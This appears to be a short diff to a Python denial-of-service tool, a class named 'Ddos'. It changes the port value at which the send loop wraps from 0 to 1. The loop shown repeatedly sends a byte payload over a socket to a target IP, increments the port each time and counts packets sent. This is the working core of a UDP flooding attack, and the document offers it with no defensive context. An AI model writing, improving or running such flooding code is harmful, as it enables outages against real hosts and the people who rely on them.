@@ -57,7 +57,7 @@ class Ddos:
         self.data['port'] = self.port
         while self.start:
             if self.data['port'] > 65535:
-                self.data['port'] = 0
+                self.data['port'] = 1
             self.sock.sendto(self.bytes, (self.ip,self.data['port']))
             self.data['sent'] += 1
             self.data['port'] += 1
